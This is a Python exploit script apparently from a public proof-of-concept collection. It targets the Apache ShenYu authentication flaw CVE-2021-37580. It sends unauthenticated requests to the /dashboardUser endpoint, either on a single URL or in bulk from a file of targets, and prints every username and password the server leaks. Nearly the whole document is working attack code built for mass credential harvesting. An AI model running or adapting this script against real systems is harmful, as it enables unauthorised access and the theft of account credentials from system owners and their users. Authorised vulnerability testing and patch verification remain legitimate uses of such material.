#!/usr/bin/env python
# -*- conding:utf-8 -*-

import requests
import argparse
import sys
import urllib3
urllib3.disable_warnings()

def title():
    print("""
                               Apache Shenyu authentication
                        use: python3 apache-shenyu-authentication.py
                                    Author: Henry4E36
               """)

class information(object):
    def __init__(self,args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url(self):
        target_url = self.url + "/dashboardUser"
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
        }
        try:
            res = requests.get(url=target_url, headers=headers, verify=False, timeout=5)
            if res.status_code == 200 and "query dashboard users success" in res.text:
                if res.json()['data']['dataList']:
                    print(f"\033[31m[{chr(8730)}] 目标系统: {self.url} 存在JWT缺陷漏洞（CVE-2021-37580）\033[0m")
                    num = 1
                    for i in res.json()['data']['dataList']:
                        print(f"\033[31m[{num}] 存在账号:{i['userName']}  密码:{i['password']} \033[0m")
                        num = num + 1
                    print("[" + "-" * 100 + "]")
            else:
                print(f"[\033[31mx\033[0m]  目标系统: {self.url} JWT缺陷漏洞（CVE-2021-37580) \033[0m")
                print("[" + "-"*100 + "]")
        except Exception as e:
            print("[\033[31mX\033[0m]  连接错误！")
            print("[" + "-"*100 + "]")

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)





if __name__ == "__main__":
    title()
    parser = ar=argparse.ArgumentParser(description='Apache ShenYu JWT缺陷')
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 apache-shenyu-authentication.py -u http://127.0.0.1\neg2:>>>python3 apache-shenyu-authentication.py -f ip.txt")
    elif args.url:
        information(args).target_url()

    elif args.file:
        information(args).file_url()

